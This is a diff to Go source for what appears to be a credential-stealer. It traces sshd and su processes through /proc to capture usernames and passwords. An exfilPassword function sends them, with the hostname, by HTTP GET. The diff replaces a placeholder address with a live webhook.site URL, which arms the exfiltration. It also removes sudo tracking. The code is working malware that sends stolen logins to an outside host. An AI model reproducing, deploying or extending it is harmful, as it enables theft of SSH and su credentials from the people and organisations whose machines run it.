@@ -47,26 +47,18 @@ func isSUPid(pid int) bool {
 	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
 }
 
-func isSUDOPid(pid int) bool {
-	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-	if err != nil {
-		return false
-	}
-	return regexp.MustCompile(`^sudo `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
-}
-
 func exfilPassword(username, password string) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		return
 	}
-	serverURL := "http://FILL:6969/"
+	serverURL := "https://webhook.site/f436b722-284a-4f5f-9aa8-836677e56dcb"
 	values := url.Values{}
 	values.Set("hostname", hostname)
 	values.Set("username", username)
 	values.Set("password", password)
 	fullURL := fmt.Sprintf("%s?%s", serverURL, values.Encode())
-	//fmt.Printf("Sending to %s\n", fullURL)
+	// fmt.Printf("Sending to %s\n", fullURL)
 	http.Get(fullURL)
 }
 
@@ -75,34 +67,30 @@ func main() {
 	var processedPids []int
 	var processedPidsMutex sync.Mutex
 
+	// fmt.Printf("Tracking: SSH, SU\n")
+	// fmt.Println()
+
 	for {
-		sshdPids := findPids()
-		for _, pid := range sshdPids {
+		pids := findPids()
+		for _, pid := range pids {
 			processedPidsMutex.Lock()
+
 			if isSSHPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					//fmt.Println("SSHD process found with PID:", pid)
+					// fmt.Println("SSHD process found with PID:", pid)
 					go traceSSHDProcess(pid)
 					processedPids = append(processedPids, pid)
 				}
 			}
+
 			if isSUPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					//fmt.Println("SU process found with PID:", pid)
+					// fmt.Println("SU process found with PID:", pid)
 					go traceSUProcess(pid)
-					processedPids = append(processedPids, pid)
-				}
-			}
-			if isSUDOPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
-				if !processedFirstPID {
-					processedFirstPID = true
-				} else {
-					//fmt.Println("SUDO process found with PID:", pid)
-					go traceSUDOProcess(pid)
 					processedPids = append(processedPids, pid)
 				}
 			}
